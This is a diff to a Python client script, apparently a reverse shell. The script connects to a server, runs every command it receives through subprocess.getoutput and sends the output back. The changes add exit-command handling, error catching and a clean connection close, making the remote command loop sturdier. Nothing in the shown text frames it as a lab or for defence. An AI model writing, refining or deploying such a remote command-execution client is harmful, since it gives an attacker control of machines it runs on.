@@ -1,4 +1,4 @@
-#!/usr/bin/env python3  # Fixing the shebang for Python 3 compatibility.
+#!/usr/bin/env python3  # Shebang for Python 3 compatibility.
 
 # Client script to connect to a server and execute received commands.
 
@@ -27,14 +27,22 @@ print("[+] Connected to the server.")
 
 # Infinite loop to continuously receive and execute commands.
 while True:
-    # Receive data/commands from the server.
-    RecvData = Connection.recv(1024).decode()  # Decoding received data.
-    
-    # Execute the received command and capture the output.
-    ClintOutput = subprocess.getoutput(RecvData)
-    
-    # Send the command output back to the server.
-    Connection.send(ClintOutput.encode())
+    try:
+        # Receive data/commands from the server.
+        RecvData = Connection.recv(1024).decode()  # Decoding received data.
+        if RecvData.lower() == "exit":  # Check if the command is "exit".
+            print("[!] Received exit command. Closing connection...")
+            break  # Exit the loop if the command is "exit".
+        
+        # Execute the received command and capture the output.
+        ClintOutput = subprocess.getoutput(RecvData)
+        
+        # Send the command output back to the server.
+        Connection.send(ClintOutput.encode())
+    except Exception as e:
+        print(f"[!] An error occurred: {e}")
+        break  # Exit on unexpected errors.
 
-# Close the connection (unreachable due to infinite loop).
-# Connection.close()  # Uncomment this if the loop is to be terminated at some point.
+# Close the connection.
+Connection.close()
+print("[+] Connection closed.")
